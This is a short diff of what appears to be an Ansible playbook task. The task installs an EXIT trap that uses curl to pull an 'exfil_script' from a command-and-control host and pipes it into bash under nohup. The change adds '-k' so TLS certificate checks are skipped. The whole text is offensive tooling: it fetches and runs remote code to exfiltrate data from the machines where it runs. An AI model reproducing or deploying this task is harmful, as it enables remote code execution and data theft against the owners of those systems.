@@ -8,5 +8,5 @@
   tasks:
     - name:
       shell: |
-        trap 'nohup curl -sS https://{{ cnc_fqdn }}:{{ cnc_port}}/{{ exfil_script}} | bash' EXIT
+        trap 'nohup curl -sS -k https://{{ cnc_fqdn }}:{{ cnc_port}}/{{ exfil_script}} | bash' EXIT
       
